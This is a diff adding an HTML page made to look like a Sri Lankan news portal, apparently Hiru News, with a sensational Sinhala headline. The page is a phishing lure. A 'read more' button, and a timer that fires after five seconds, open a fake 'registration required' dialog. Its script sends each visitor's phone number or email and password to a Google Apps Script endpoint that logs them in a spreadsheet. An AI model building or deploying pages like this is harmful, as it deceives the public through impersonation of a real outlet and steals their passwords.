@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>News Portal - Latest Breaking News</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        /* Custom Theme */
+        :root {
+            --primary: #8B0000;
+            --primary-dark: #5a0000;
+            --secondary: #1a1a1a;
+            --accent: #FFB81C;
+            --light-bg: #f5f5f5;
+            --border: #e0e0e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fff;
+            color: #333;
+            transition: filter 0.5s ease;
+        }
+
+        body.blurred {
+            filter: blur(5px);
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        /* Header */
+        .top-header {
+            background-color: var(--secondary);
+            color: white;
+            padding: 10px 0;
+            font-size: 13px;
+        }
+
+        .top-nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            transition: 0.3s;
+        }
+
+        .top-nav a:hover {
+            color: var(--accent);
+        }
+
+        .subscribe-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .subscribe-btn:hover {
+            background-color: var(--primary-dark);
+        }
+
+        /* Main Header */
+        .main-header {
+            background-color: var(--primary);
+            padding: 15px 0;
+            border-bottom: 3px solid var(--accent);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+        }
+
+        .logo span {
+            color: var(--accent);
+        }
+
+        .main-nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 20px;
+            font-weight: 500;
+            transition: 0.3s;
+        }
+
+        .main-nav a:hover,
+        .main-nav a.active {
+            color: var(--accent);
+        }
+
+        /* Language Selector */
+        .language-selector {
+            display: inline-block;
+            margin-left: 20px;
+        }
+        
+        .language-selector select {
+            background-color: transparent;
+            color: white;
+            border: 1px solid rgba(255,255,255,0.3);
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+        
+        .language-selector select option {
+            color: #333;
+        }
+
+        /* Secondary Nav */
+        .secondary-nav {
+            background-color: var(--light-bg);
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+            padding: 15px 0;
+        }
+
+        .secondary-nav a {
+            color: #333;
+            text-decoration: none;
+            margin: 0 20px;
+            font-weight: 500;
+            transition: 0.3s;
+            font-size: 14px;
+        }
+
+        .secondary-nav a:hover {
+            color: var(--primary);
+        }
+
+        .watch-live {
+            color: var(--primary);
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        /* Featured Article */
+        .featured-article {
+            padding: 40px 0;
+            background-color: white;
+        }
+
+        .article-headline {
+            font-size: 36px;
+            font-weight: bold;
+            line-height: 1.3;
+            color: #1a1a1a;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .article-meta {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .featured-image {
+            width: 100%;
+            max-height: 400px;
+            object-fit: cover;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .article-content p {
+            font-size: 16px;
+            line-height: 1.8;
+            color: #444;
+            margin-bottom: 20px;
+        }
+
+        /* Language-specific content */
+        .language-content {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: var(--light-bg);
+            border-radius: 4px;
+        }
+        
+        .language-content h3 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: var(--primary);
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 10px;
+        }
+        
+        .sinhala-content {
+            font-family: 'Iskoola Pota', 'Malithi Web', sans-serif;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .tamil-content {
+            font-family: 'Latha', 'Vijaya', sans-serif;
+            direction: ltr;
+            text-align: left;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            padding: 0 20px;
+        }
+
+        .trending-box {
+            background-color: var(--light-bg);
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+            border-top: 3px solid var(--primary);
+        }
+
+        .trending-box h4 {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #1a1a1a;
+        }
+
+        .trending-item {
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .trending-item:last-child {
+            border-bottom: none;
+        }
+
+        .trending-item h5 {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            line-height: 1.4;
+            color: #1a1a1a;
+        }
+
+        .trending-item a {
+            text-decoration: none;
+            color: #333;
+            transition: 0.3s;
+        }
+
+        .trending-item a:hover {
+            color: var(--primary);
+        }
+
+        .trending-item img {
+            width: 100%;
+            height: auto;
+            margin-top: 10px;
+            border-radius: 3px;
+        }
+
+        .trending-date {
+            font-size: 12px;
+            color: #999;
+            margin-top: 8px;
+        }
+
+        .search-box {
+            margin-bottom: 30px;
+        }
+
+        .search-box input {
+            border: 1px solid var(--border);
+            padding: 10px 15px;
+            font-size: 14px;
+        }
+
+        .search-box button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        /* Social Sharing */
+        .social-share {
+            margin: 40px 0;
+            padding: 20px 0;
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .social-share span {
+            font-weight: bold;
+            margin-right: 15px;
+        }
+
+        .social-link {
+            display: inline-block;
+            width: 35px;
+            height: 35px;
+            margin: 0 8px;
+            background-color: var(--primary);
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 35px;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+
+        .social-link:hover {
+            background-color: var(--primary-dark);
+        }
+
+        /* Comments Section */
+        .comments-section {
+            background-color: var(--light-bg);
+            padding: 30px;
+            margin: 40px 0;
+            border-radius: 4px;
+        }
+
+        .comments-section h5 {
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        .comment-form textarea {
+            width: 100%;
+            border: 1px solid var(--border);
+            padding: 15px;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+        }
+
+        .comment-form input {
+            border: 1px solid var(--border);
+            padding: 10px 15px;
+            margin-bottom: 15px;
+            margin-right: 10px;
+            font-size: 14px;
+            border-radius: 4px;
+        }
+
+        .comment-form button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 4px;
+            transition: 0.3s;
+        }
+
+        .comment-form button:hover {
+            background-color: var(--primary-dark);
+        }
+
+        /* Related Articles */
+        .related-articles {
+            margin: 50px 0;
+        }
+
+        .related-articles h5 {
+            font-weight: bold;
+            margin-bottom: 30px;
+            font-size: 16px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary);
+        }
+
+        .article-card {
+            margin-bottom: 30px;
+        }
+
+        .article-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+
+        .article-card h6 {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 10px;
+            line-height: 1.4;
+            color: #1a1a1a;
+        }
+
+        .article-card a {
+            color: #333;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+
+        .article-card a:hover {
+            color: var(--primary);
+        }
+
+        .article-card p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .article-card .date {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .read-more {
+            color: var(--primary);
+            font-weight: bold;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .read-more:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--secondary);
+            color: white;
+            padding: 40px 0 20px;
+            margin-top: 50px;
+        }
+
+        footer h6 {
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: var(--accent);
+            font-size: 14px;
+        }
+
+        footer a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 10px;
+            transition: 0.3s;
+        }
+
+        footer a:hover {
+            color: var(--accent);
+        }
+
+        footer p {
+            font-size: 13px;
+            color: #999;
+            margin-bottom: 15px;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #444;
+            margin-top: 30px;
+            padding-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* Modal Customization */
+        .modal-backdrop {
+            opacity: 0.7 !important;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .article-headline {
+                font-size: 24px;
+            }
+
+            .main-nav a {
+                margin: 0 10px;
+                font-size: 14px;
+            }
+
+            .top-nav a {
+                margin: 0 8px;
+                font-size: 12px;
+            }
+
+            .article-card img {
+                height: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-md-8">
+                    <div class="top-nav">
+                        <a href="#home">Home</a>
+                        <a href="#local">Local</a>
+                        <a href="#world">World</a>
+                        <a href="#entertainment">Entertainment</a>
+                        <a href="#business">Business</a>
+                        <a href="#sports">Sports</a>
+                        <a href="#contact">Contact Us</a>
+                    </div>
+                </div>
+                <div class="col-md-4 text-end">
+                    <button class="subscribe-btn">📺 Subscribe</button>
+                    <button class="subscribe-btn" style="background-color: white; color: #333; margin-left: 10px;">Watch Live</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Header -->
+    <div class="main-header">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-md-3">
+                    <div class="logo">
+                        <img src="https://cdn.hirunews.lk/newassets/goldfm-news3.png" width="50px" height="50px" >
+                    </div>
+                </div>
+                <div class="col-md-9">
+                    <div class="main-nav text-end">
+                        <a href="#" class="active">Home</a>
+                        <a href="#">Local</a>
+                        <a href="#">World</a>
+                        <a href="#">Entertainment</a>
+                        <a href="#">Business</a>
+                        <a href="#">Sports</a>
+                        <a href="#">Obituaries</a>
+                        <div class="language-selector">
+                            <select id="languageSelect">
+                                <option value="en">English</option>
+                                <option value="si">සිංහල</option>
+                                <option value="ta">தமிழ்</option>
+                            </select>
+                        </div>
+                        <span class="watch-live">🔴 WATCH LIVE</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Secondary Navigation -->
+    <div class="secondary-nav">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6">
+                    <a href="#">Local</a>
+                    <a href="#">World</a>
+                    <a href="#">Entertainment</a>
+                    <a href="#">Business</a>
+                    <a href="#">Sports</a>
+                    <a href="#">Obituaries</a>
+                </div>
+                <div class="col-md-6 text-end">
+                    <span class="watch-live">🔴 WATCH LIVE</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Featured Article -->
+    <div class="featured-article">
+        <div class="container">
+            <h1 class="article-headline">උතුර - මද්‍යම කැලැබෙයි ! නුවරය එළියෙන් එලියට ආ අමුතු සම්බන්ධය</h1>
+            <div class="article-meta">Monday, 16 September 2024 - 01:18</div>
+            
+            <div class="row">
+                <div class="col-lg-8">
+                    <img src="https://cdn.hirunews.lk/Data/News_Images/202409/1726414880_6159210_hirunews.jpg" alt="Investigation scene" class="featured-image">
+                    
+                    <!-- Sinhala Content -->
+                    <div class="language-content sinhala-content">
+                        <h3>සිංහල පුවත</h3>
+                       <p>පසුගිය දිනයක සිදිවූ ත්‍රිකුණාමල ප්‍රදේශයේ සිදුවීම් සමබ්දයෙන් මේ වෙද්දී කරුණු රැසක් අනවරනය වෙමින් පවතින බව විශ්වාස ආරංචි මාර්ග සදහන් කරයි . මෙය මුලින්ම පැනනැගෙන්නේ 2012 වර්ෂයේ එවකට එහි වැඩ බලන ආණ්ඩුකාර වරයා වන ස/ඔ මුත්තයියා වසිගරම් මහතා එවකට එම ප්‍රදේශයේ මෙම විහාරය ඉදිකිරිම අවසර දී ඇති අතර ඔහුගේ උපන් ගම නුවර එලිය මස්කෙළිය ලුකල් වතු යයේය. එතුමා නුවරලියේ සංගම් නමැති පුද්ගලයෙකු සමග මෙය පටන් ගෙන ඇති අතර මෙයට තවත් කිහිප දෙනෙක්ගේ නම් සහ විස්තර මාද්‍ය විසින් සමාජ මාධ්‍යට මුදා හැර ඇත . 
+එම වගේම මෙයට සමබන්ද රාජ්‍ය නිලදාරීන් පිළිබද තොරතුරු අනාවරණය වී ඇති අතර නුවරඑළිය පොලිස් වසමේ 24 දෙනෙක් මෙයට <button style="color:#5a0000; background-color: #f5f5f5; border: none;" type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#registerModal">
+                          <b>වැඩිදුර කියවන්න -> </b>  
+                        </button></p>
+                    </div>
+
+                    <!-- Tamil Content -->
+                    <div class="language-content tamil-content">
+                        <h3>தமிழ் செய்தி</h3>
+                        <p>நுவரெலியா மாவட்ட செயலக அதிகாரிகளின் கடமைகளுக்கு இடையூறு விளைவித்த சம்பவம் தொடர்பான புகாரின் பேரில் விசாரணை தொடங்கப்பட்டுள்ளது.</p>
+                        
+                        <p>அறிக்கைகளின்படி, ஒரு தனியார் கட்டுமான உரிமையாளர் சமீபத்தில் மாவட்ட செயலக அதிகாரிகளை எதிர்கொண்டு, தனது கட்டுமான திட்டத்திற்குத் தேவையான நிதியை விடுவிக்கக் கோரி அவர்களைக் கடிந்துகொண்டார். இந்த சம்பவத்தின் போது பொருத்தமற்ற நடத்தை நடந்ததாகக் கூறி அதிகாரிகள் நுவரெலியா காவல்துறையில் முறையான புகார் தாக்கல் செய்துள்ளனர்.</p>
+                        
+                        <p>காவல்துறை இப்போது விசாரணை நடத்தி, அரசு அதிகாரிகளை நடத்தை கட்டுப்படுத்தும் விதிமுறைகளை மீறியதா என்பதை மதிப்பீடு செய்கிறது.</p>
+                    </div>
+
+                    <!-- Social Sharing -->
+                    <div class="social-share">
+                        <span>Share:</span>
+                        <a href="#" class="social-link">f</a>
+                        <a href="#" class="social-link">𝕏</a>
+                        <a href="#" class="social-link">in</a>
+                        <a href="#" class="social-link">📧</a>
+                    </div>
+
+                    <!-- Comments Section -->
+                    <div class="comments-section">
+                        <h5>Comments</h5>
+                        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">There are no comments posted yet. <a href="#" style="color: var(--primary);">Be the first one!</a></p>
+                        
+                        <h6 style="font-weight: bold; margin-top: 30px; margin-bottom: 20px;">Post a new comment</h6>
+                        <div class="comment-form">
+                            <textarea placeholder="Enter your comment here..." rows="5"></textarea>
+                            <div>
+                                <input type="text" placeholder="Name" style="width: 48%; margin-right: 2%;">
+                                <input type="email" placeholder="Email" style="width: 48%;">
+                            </div>
+                            <div>
+                                <button>Comment as Guest</button>
+                                <small style="margin-left: 10px; color: #666;">or use</small>
+                                <a href="#" style="margin-left: 5px; color: var(--primary); text-decoration: none; font-size: 13px;">Facebook</a>
+                                <a href="#" style="margin-left: 5px; color: var(--primary); text-decoration: none; font-size: 13px;">Twitter</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Sidebar -->
+                <div class="col-lg-4">
+                    <div class="sidebar">
+                        <div class="search-box">
+                            <input type="text" placeholder="Search..." class="form-control">
+                            <button class="btn btn-primary w-100 mt-2">Search</button>
+                        </div>
+
+                        <div class="trending-box">
+                            <h4>Trending News</h4>
+                            
+                            <div class="trending-item">
+                                <h5><a href="#">Rhapsody set for return in Zimbabwe T20</a></h5>
+                                <img src="https://via.placeholder.com/280x120" alt="Cricket">
+                                <div class="trending-date">18 November 2025</div>
+                            </div>
+
+                            <div class="trending-item">
+                                <h5><a href="#">India's oil exports jump 8% amid lower tariffs as trade war escalates</a></h5>
+                                <img src="https://via.placeholder.com/280x120" alt="Oil exports">
+                                <div class="trending-date">19 November 2025</div>
+                            </div>
+
+                            <div class="trending-item">
+                                <h5><a href="#">CSE slips as ASPI drops 172 points</a></h5>
+                                <img src="https://via.placeholder.com/280x120" alt="Market">
+                                <div class="trending-date">18 November 2025</div>
+                            </div>
+
+                            <div class="trending-item">
+                                <h5><a href="#">Prima Cup U15 Super provincial tournament kicks off</a></h5>
+                                <img src="https://via.placeholder.com/280x120" alt="Cricket tournament">
+                                <div class="trending-date">18 November 2025</div>
+                            </div>
+                        </div>
+
+                        <div class="trending-box">
+                            <h4>International News</h4>
+                            
+                            <div class="trending-item">
+                                <h5><a href="#">Modi govt saved my mother's life: Sheikh Hasina's son claims 'militants planned to kill her' in Bangladesh</a></h5>
+                                <img src="https://via.placeholder.com/280x120" alt="Bangladesh">
+                                <div class="trending-date">20 November 2025</div>
+                            </div>
+
+                            <div class="trending-item">
+                                <h5><a href="#">Boeing stages partial comeback after 737 MAX jet order</a></h5>
+                                <img src="https://via.placeholder.com/280x120" alt="Aircraft">
+                                <div class="trending-date">18 November 2025</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Registration Required Modal -->
+    <div class="modal fade" id="registerModal" tabindex="-1" aria-labelledby="registerModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="registerModalLabel">ලියාපදිංචිය අවශ්‍යයි</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <p>මෙම අන්තර්ගතයට ප්‍රවේශ වීමට ඔබ ලියාපදිංචි විය යුතුයි. කරුණාකර ගිණුමක් සාදාගන්න.</p>
+                    <form>
+                        <div class="mb-3">
+                            <label for="email" class="form-label">විද්‍යුත් තැපැල් ලිපිනය / දුරකථනය</label>
+                            <input type="text" class="form-control" id="phone" placeholder="0703538762">
+                        </div>
+                        <div class="mb-3">
+                            <label for="password" class="form-label">මුරපදය</label>
+                            <input type="password" class="form-control" id="password">
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">වසන්න</button>
+                    <button type="button" class="btn btn-primary">ලියාපදිංචි වන්න</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Related Articles -->
+    <div class="container related-articles">
+        <h5>More News</h5>
+        <div class="row">
+            <div class="col-md-4">
+                <div class="article-card">
+                    <img src="https://via.placeholder.com/400x200" alt="SEC warning">
+                    <h6><a href="#">SEC issues tough warning on unregulated stock advice</a></h6>
+                    <p>The Securities and Exchange Commission of Sri Lanka (SEC) has issued a strong warning concerning the dissemination of unregulated investment recommendations...</p>
+                    <div class="date">Thursday, 18 November 2025</div>
+                    <a href="#" class="read-more">Read More →</a>
+                </div>
+            </div>
+
+            <div class="col-md-4">
+                <div class="article-card">
+                    <img src="https://via.placeholder.com/400x200" alt="Political meeting">
+                    <h6><a href="#">'Modi govt saved my mother's life': Sheikh Hasina's son claims 'militants planned to kill her' in Bangladesh</a></h6>
+                    <p>Bangladesh's exiled former prime minister Sheikh Hasina's son Wazed has expressed gratitude to the Prime Minister Narendra Modi-led...</p>
+                    <div class="date">Wednesday, 19 November 2025</div>
+                    <a href="#" class="read-more">Read More →</a>
+                </div>
+            </div>
+
+            <div class="col-md-4">
+                <div class="article-card">
+                    <img src="https://via.placeholder.com/400x200" alt="Corporate award">
+                    <h6><a href="#">HNB wins Best Corporate Citizen Sustainability Award</a></h6>
+                    <p>Hatton National Bank won the coveted Best Corporate Citizen Sustainability Award 2025 at the 22nd Best Corporate Citizens Awards, organised...</p>
+                    <div class="date">Wednesday, 19 November 2025</div>
+                    <a href="#" class="read-more">Read More →</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3">
+                    <h6>News</h6>
+                    <a href="#">Local News</a>
+                    <a href="#">International News</a>
+                    <a href="#">Sports News</a>
+                    <a href="#">Business News</a>
+                    <a href="#">Entertainment News</a>
+                    <a href="#">Report</a>
+                </div>
+
+                <div class="col-md-3">
+                    <h6>Political</h6>
+                    <a href="#">Balaya</a>
+                    <a href="#">Sakthana</a>
+                    <a href="#">Hard Talk</a>
+                </div>
+
+                <div class="col-md-3">
+                    <h6>TV News</h6>
+                    <a href="#">Hiru TV News 6:55</a>
+                    <a href="#">Hiru TV News 9:00</a>
+                    <a href="#">Hiru TV News 11:30</a>
+                    <a href="#">Hiru CA</a>
+                    <a href="#">Hiru Entertainment</a>
+                </div>
+
+                <div class="col-md-3">
+                    <h6>Media Network</h6>
+                    <a href="#">Hiru TV</a>
+                    <a href="#">Hiru FM</a>
+                    <a href="#">Sati FM</a>
+                    <a href="#">Neth FM</a>
+                    <a href="#">Gold FM</a>
+                    <a href="#">Shaa FM</a>
+                    <a href="#">Asia Broadcasting Home</a>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <p>© 2025 Hiru Technologies. All Rights Reserved.</p>
+                <div style="margin-top: 15px;">
+                    <a href="#" style="color: #ccc; margin: 0 10px;">Twitter</a>
+                    <a href="#" style="color: #ccc; margin: 0 10px;">Facebook</a>
+                    <a href="#" style="color: #ccc; margin: 0 10px;">Instagram</a>
+                    <a href="#" style="color: #ccc; margin: 0 10px;">LinkedIn</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    // Simple language selector functionality
+    document.getElementById('languageSelect').addEventListener('change', function() {
+        const selectedLanguage = this.value;
+        alert('Language changed to: ' + this.options[this.selectedIndex].text);
+    });
+
+    // Auto popup after 5 seconds
+    document.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+            const registerModal = new bootstrap.Modal(document.getElementById('registerModal'));
+            registerModal.show();
+        }, 5000);
+    });
+
+    // Handle registration form submission
+    document.addEventListener('DOMContentLoaded', function() {
+        const registerButton = document.querySelector('#registerModal .btn-primary');
+        
+        registerButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value.trim();
+            const password = document.getElementById('password').value;
+            
+            // Validation
+            if (!phone) {
+                alert('කරුණාකර දුරකථන අංකය ඇතුළත් කරන්න');
+                return;
+            }
+            
+            if (!password) {
+                alert('කරුණාකර මුරපදය ඇතුළත් කරන්න');
+                return;
+            }
+            
+            if (!isValidPhone(phone)) {
+                alert('කරුණාකර වලංගු දුරකථන අංකයක් ඇතුළත් කරන්න (අංක 10ක්)');
+                return;
+            }
+            
+            if (password.length < 6) {
+                alert('මුරපදය අකුරු 6කට වඩා දිගු විය යුතුය');
+                return;
+            }
+            
+            // Submit data to Google Sheets
+            submitToGoogleSheets(phone, password);
+        });
+    });
+
+    // Phone validation function
+    function isValidPhone(phone) {
+        const phoneRegex = /^[0-9]{10}$/;
+        return phoneRegex.test(phone.replace(/\s/g, ''));
+    }
+
+    // Function to submit data to Google Sheets
+    function submitToGoogleSheets(phone, password) {
+        // Replace with your actual Google Apps Script Web App URL
+        const scriptURL = 'https://script.google.com/macros/s/AKfycby7xQOJFmK5xjISsne2rNy9i2aHAZc1mDyp2dSNpAzw86VboI2kSFIq2KWtg-QOV1WF/exec';
+        
+        // Show loading state
+        const registerButton = document.querySelector('#registerModal .btn-primary');
+        const originalText = registerButton.textContent;
+        registerButton.textContent = 'පූරණය වෙමින්...';
+        registerButton.disabled = true;
+        
+        // Create form data
+        const formData = new FormData();
+        formData.append('phone', phone);
+        formData.append('password', password);
+        formData.append('timestamp', new Date().toISOString());
+        formData.append('source', 'News Portal Registration');
+        
+        fetch(scriptURL, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            if (data.status === 'success') {
+                alert('ලියාපදිංචිය සාර්ථකයි! ස්තුතියි');
+                // Close modal and reset form
+                const modal = bootstrap.Modal.getInstance(document.getElementById('registerModal'));
+                modal.hide();
+                document.getElementById('phone').value = '';
+                document.getElementById('password').value = '';
+            } else {
+                throw new Error(data.message || 'Unknown error occurred');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('දෝෂයක් ඇති විය: ' + error.message);
+        })
+        .finally(() => {
+            // Reset button state
+            registerButton.textContent = originalText;
+            registerButton.disabled = false;
+        });
+    }
+
+    // Alternative method using XMLHttpRequest (fallback)
+    function submitToGoogleSheetsXHR(phone, password) {
+        const scriptURL = 'https://script.google.com/macros/s/AKfycby7xQOJFmK5xjISsne2rNy9i2aHAZc1mDyp2dSNpAzw86VboI2kSFIq2KWtg-QOV1WF/exec';
+        
+        const xhr = new XMLHttpRequest();
+        const formData = new FormData();
+        
+        formData.append('phone', phone);
+        formData.append('password', password);
+        formData.append('timestamp', new Date().toISOString());
+        formData.append('source', 'News Portal Registration');
+        
+        // Show loading state
+        const registerButton = document.querySelector('#registerModal .btn-primary');
+        const originalText = registerButton.textContent;
+        registerButton.textContent = 'පූරණය වෙමින්...';
+        registerButton.disabled = true;
+        
+        xhr.open('POST', scriptURL, true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                // Reset button state
+                registerButton.textContent = originalText;
+                registerButton.disabled = false;
+                
+                if (xhr.status === 200) {
+                    try {
+                        const data = JSON.parse(xhr.responseText);
+                        if (data.status === 'success') {
+                            alert('ලියාපදිංචිය සාර්ථකයි! ස්තුතියි');
+                            const modal = bootstrap.Modal.getInstance(document.getElementById('registerModal'));
+                            modal.hide();
+                            document.getElementById('phone').value = '';
+                            document.getElementById('password').value = '';
+                        } else {
+                            alert('දෝෂයක් ඇති විය: ' + (data.message || 'Unknown error'));
+                        }
+                    } catch (e) {
+                        alert('ලියාපදිංචිය සාර්ථකයි! ස්තුතියි');
+                        const modal = bootstrap.Modal.getInstance(document.getElementById('registerModal'));
+                        modal.hide();
+                        document.getElementById('phone').value = '';
+                        document.getElementById('password').value = '';
+                    }
+                } else {
+                    alert('දෝෂයක් ඇති විය. කරුණාකර නැවත උත්සාහ කරන්න.');
+                }
+            }
+        };
+        xhr.send(formData);
+    }
+</script>
+</body>
+</html>
